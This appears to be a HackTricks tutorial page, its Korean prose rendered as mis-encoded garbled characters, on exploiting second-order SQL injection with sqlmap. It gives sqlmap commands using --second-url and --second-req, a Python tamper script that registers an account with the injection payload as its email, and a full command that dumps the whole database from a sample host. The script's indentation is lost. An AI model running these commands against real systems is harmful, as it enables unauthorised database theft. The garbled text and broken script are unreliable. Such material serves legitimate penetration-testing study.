{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


**SQLMapì€ 2ì°¨ SQLië¥¼ ì´ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
ë‹¤ìŒ ì •ë³´ë¥¼ ì œê³µí•´ì•¼ í•©ë‹ˆë‹¤:

* **SQL ì¸ì ì…˜ í˜ì´ë¡œë“œ**ê°€ ì €ì¥ë  **ìš”ì²­**
* **í˜ì´ë¡œë“œ**ê°€ **ì‹¤í–‰ë ** **ìš”ì²­**

SQL ì¸ì ì…˜ í˜ì´ë¡œë“œê°€ ì €ì¥ë˜ëŠ” ìš”ì²­ì€ **sqlmapì˜ ë‹¤ë¥¸ ì¸ì ì…˜ê³¼ ê°™ì´ í‘œì‹œë©ë‹ˆë‹¤**. SQL ì¸ì ì…˜ì˜ **ì¶œë ¥/ì‹¤í–‰ì„ sqlmapì´ ì½ì„ ìˆ˜ ìˆëŠ” ìš”ì²­**ì€ `--second-url` ë˜ëŠ” íŒŒì¼ì—ì„œ ì „ì²´ ìš”ì²­ì„ ì§€ì •í•´ì•¼ í•˜ëŠ” ê²½ìš° `--second-req`ë¡œ í‘œì‹œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ê°„ë‹¨í•œ 2ì°¨ ì˜ˆì‹œ:**
```bash
#Get the SQL payload execution with a GET to a url
sqlmap -r login.txt -p username --second-url "http://10.10.10.10/details.php"

#Get the SQL payload execution sending a custom request from a file
sqlmap -r login.txt -p username --second-req details.txt
```
ì—¬ëŸ¬ ê²½ìš°ì— **ì´ê²ƒë§Œìœ¼ë¡œëŠ” ì¶©ë¶„í•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤**. ì™œëƒí•˜ë©´ **í˜ì´ë¡œë“œë¥¼ ì „ì†¡í•˜ê³  ë‹¤ë¥¸ í˜ì´ì§€ì— ì ‘ê·¼í•˜ëŠ” ê²ƒ ì™¸ì— ë‹¤ë¥¸ ì‘ì—…ì„ ìˆ˜í–‰í•´ì•¼** í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

ì´ëŸ´ ë•ŒëŠ” **sqlmap tamper**ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ëŠ” **sqlmap í˜ì´ë¡œë“œë¥¼ ì´ë©”ì¼ë¡œ ì‚¬ìš©í•˜ì—¬** ìƒˆ ì‚¬ìš©ìë¥¼ ë“±ë¡í•˜ê³  ë¡œê·¸ì•„ì›ƒí•©ë‹ˆë‹¤.
```python
#!/usr/bin/env python

import re
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
pass

def login_account(payload):
proxies = {'http':'http://127.0.0.1:8080'}
cookies = {"PHPSESSID": "6laafab1f6om5rqjsbvhmq9mf2"}

params = {"username":"asdasdasd", "email":payload, "password":"11111111"}
url = "http://10.10.10.10/create.php"
pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

url = "http://10.10.10.10/exit.php"
pr = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

def tamper(payload, **kwargs):
headers = kwargs.get("headers", {})
login_account(payload)
return payload
```
A **SQLMap tamperëŠ” í˜ì´ë¡œë“œë¡œ ì¸ì ì…˜ ì‹œë„ë¥¼ ì‹œì‘í•˜ê¸° ì „ì— í•­ìƒ ì‹¤í–‰ë©ë‹ˆë‹¤** **ê·¸ë¦¬ê³  í˜ì´ë¡œë“œë¥¼ ë°˜í™˜í•´ì•¼ í•©ë‹ˆë‹¤**. ì´ ê²½ìš° ìš°ë¦¬ëŠ” í˜ì´ë¡œë“œì— ì‹ ê²½ ì“°ì§€ ì•Šì§€ë§Œ, ëª‡ ê°€ì§€ ìš”ì²­ì„ ë³´ë‚´ëŠ” ê²ƒì— ì‹ ê²½ ì“°ë¯€ë¡œ í˜ì´ë¡œë“œëŠ” ë³€ê²½ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

ê·¸ë˜ì„œ, ì–´ë–¤ ì´ìœ ë¡œ ì¸í•´ ë‘ ë²ˆì§¸ ìˆœì„œ SQL ì¸ì ì…˜ì„ ì´ìš©í•˜ê¸° ìœ„í•´ ë” ë³µì¡í•œ íë¦„ì´ í•„ìš”í•˜ë‹¤ë©´:

* "ì´ë©”ì¼" í•„ë“œì— SQLi í˜ì´ë¡œë“œê°€ í¬í•¨ëœ ê³„ì • ìƒì„±
* ë¡œê·¸ì•„ì›ƒ
* í•´ë‹¹ ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ (login.txt)
* SQL ì¸ì ì…˜ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•œ ìš”ì²­ ì „ì†¡ (second.txt)

**ì´ sqlmap ëª…ë ¹ì–´ê°€ ë„ì›€ì´ ë  ê²ƒì…ë‹ˆë‹¤:**
```bash
sqlmap --tamper tamper.py -r login.txt -p email --second-req second.txt --proxy http://127.0.0.1:8080 --prefix "a2344r3F'" --technique=U --dbms mysql --union-char "DTEC" -a
##########
# --tamper tamper.py : Indicates the tamper to execute before trying each SQLipayload
# -r login.txt : Indicates the request to send the SQLi payload
# -p email : Focus on email parameter (you can do this with an "email=*" inside login.txt
# --second-req second.txt : Request to send to execute the SQLi and get the ouput
# --proxy http://127.0.0.1:8080 : Use this proxy
# --technique=U : Help sqlmap indicating the technique to use
# --dbms mysql : Help sqlmap indicating the dbms
# --prefix "a2344r3F'" : Help sqlmap detecting the injection indicating the prefix
# --union-char "DTEC" : Help sqlmap indicating a different union-char so it can identify the vuln
# -a : Dump all
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
